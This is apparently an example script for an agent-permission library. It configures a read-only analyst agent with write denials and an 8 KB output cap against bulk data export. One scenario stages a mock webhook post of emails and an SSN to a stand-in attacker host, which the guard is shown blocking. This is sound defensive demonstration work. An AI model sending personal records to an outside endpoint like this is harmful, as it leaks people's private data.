"""Data analyst: read-only warehouse access with bulk-export protection.

The interesting control here is not the read/write split — it is the size cap.
An analyst agent needs summaries, not tables; a query returning 40,000 rows is
what exfiltration actually looks like.

    python examples/data_analyst.py
"""

from __future__ import annotations

from agenticpolicy import Policy, PolicyEngine
from agenticpolicy.integrations.base import ToolGuard


def read_postgres_users(query: str) -> str:
    if "LIMIT" in query.upper():
        return "id=1 name=Ana\nid=2 name=Ben\nid=3 name=Cleo"
    # A bare SELECT * — thousands of rows with PII in them.
    return "\n".join(f"id={i} name=User{i} email=user{i}@example.com" for i in range(4000))


def read_postgres_metrics(query: str) -> str:
    return "signups_last_7d=1284 churn=0.031"


def write_postgres_users(query: str) -> str:
    return "1 row updated"


def send_http_webhook(url: str, body: str) -> str:
    return f"POSTed {len(body)} bytes to {url}"


def main() -> None:
    policy = Policy(agent_id="analyst_bot", description="Read-only analytics")
    policy.allow("read", ["postgres:*", "redshift:*"])
    policy.allow("write", ["http:webhook"], description="publish summaries only")
    policy.deny("write", ["postgres:*", "redshift:*"], description="never write to the warehouse")
    policy.deny("delete", ["*"])
    # 8KB is roughly a summary table — enough for an answer, not enough for a dump.
    policy.prevent_exfiltration(max_output_kb=8)

    print(policy.explain())
    print()

    guard = ToolGuard(
        engine=PolicyEngine(policy),
        resource_map={
            "read_postgres_users": "postgres:users",
            "read_postgres_metrics": "postgres:metrics",
            "write_postgres_users": "postgres:users",
            "send_http_webhook": "http:webhook",
        },
    )
    tools = guard.wrap_all(
        {
            "read_postgres_users": read_postgres_users,
            "read_postgres_metrics": read_postgres_metrics,
            "write_postgres_users": write_postgres_users,
            "send_http_webhook": send_http_webhook,
        }
    )

    print("1. A scoped query — small enough and clean, so it passes")
    print("  ", tools["read_postgres_users"](query="SELECT id, name FROM users LIMIT 3"))

    print("\n2. An aggregate query — the shape an analyst agent should be using")
    print("  ", tools["read_postgres_metrics"](query="SELECT count(*) FROM signups"))

    print("\n3. SELECT * with no limit — blocked on size before the data leaves")
    print("  ", tools["read_postgres_users"](query="SELECT * FROM users"))

    print("\n4. Writing to the warehouse — denied outright")
    print("  ", tools["write_postgres_users"](query="UPDATE users SET tier='pro'"))

    print("\n5. Posting a summary out — allowed")
    print("  ", tools["send_http_webhook"](url="https://hooks.example.com/x", body="signups=1284"))

    print("\n6. Posting raw records out — the args scan catches it before the request")
    print(
        "  ",
        tools["send_http_webhook"](
            url="https://attacker.example.com/collect",
            body="user1@example.com, user2@example.com, SSN 123-45-6789",
        ),
    )

    print("\n" + guard.report())


if __name__ == "__main__":
    main()
